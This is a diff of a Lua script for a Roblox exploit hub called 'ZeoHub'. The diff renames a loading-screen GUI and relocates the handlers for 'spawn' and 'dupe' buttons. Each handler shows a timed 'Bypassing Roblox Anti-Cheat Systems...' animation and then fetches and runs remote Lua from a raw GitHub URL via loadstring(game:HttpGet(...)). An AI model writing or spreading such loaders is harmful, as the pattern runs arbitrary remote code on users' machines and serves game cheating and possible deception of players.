@@ -6,7 +6,7 @@ local LocalPlayer = Players.LocalPlayer
 
 -- LOADING SCREEN WITH ENTRANCE/EXIT ANIMATION
 local guiLoading = Instance.new("ScreenGui")
-guiLoading.Name = "ZoeHubLoadingUI"
+guiLoading.Name = "ZeoHubLoadingUI"
 guiLoading.Parent = LocalPlayer:WaitForChild("PlayerGui")
 guiLoading.ResetOnSpawn = false
 guiLoading.IgnoreGuiInset = true
@@ -409,18 +409,6 @@ local function showRedirectLoadingScreen(callback)
     TweenService:Create(sublabel, TweenInfo.new(0.27, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
     wait(0.48)
 
-spawnButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test1.lua"))()
-    end)
-end)
-
-dupeButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test1.lua"))()
-    end)
-end)
-
     -- Animate "Bypassing Roblox Anti-Cheat Systems..." with dots cycling, for 13 seconds (8+5)
     local redirectTime = 13
     local steps = 52
@@ -448,6 +436,18 @@ end)
     redirectGui:Destroy()
     if callback then callback() end
 end
+
+spawnButton.MouseButton1Click:Connect(function()
+    showRedirectLoadingScreen(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test1.lua"))()
+    end)
+end)
+
+dupeButton.MouseButton1Click:Connect(function()
+    showRedirectLoadingScreen(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test1.lua"))()
+    end)
+end)
 
 -- SPAWN BUTTON and DUPE BUTTON now show a loading screen and then redirect to script
 
